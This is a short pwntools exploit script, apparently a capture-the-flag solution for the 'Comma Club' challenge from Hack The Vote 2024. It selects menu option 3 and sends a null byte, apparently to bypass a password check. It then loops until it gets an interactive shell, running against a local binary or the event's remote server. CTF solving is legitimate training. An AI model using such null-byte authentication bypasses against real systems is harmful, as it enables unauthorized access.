#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/Hack The Vote 2024/pwn/Comma Club/challenge')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', b'\x00')

    if b'Incorrect' in r.recv():
        r.close()
        return
    else:
        r.interactive()
        exit(0)

if __name__ == '__main__':
    while True:
        if len(sys.argv) == 2 and sys.argv[1] == 'remote':
            REMOTE = True
            r = remote('comma-club.chal.hackthe.vote', 1337)
        else:
            REMOTE = False
            r = process([TARGET,])

        exploit(r)
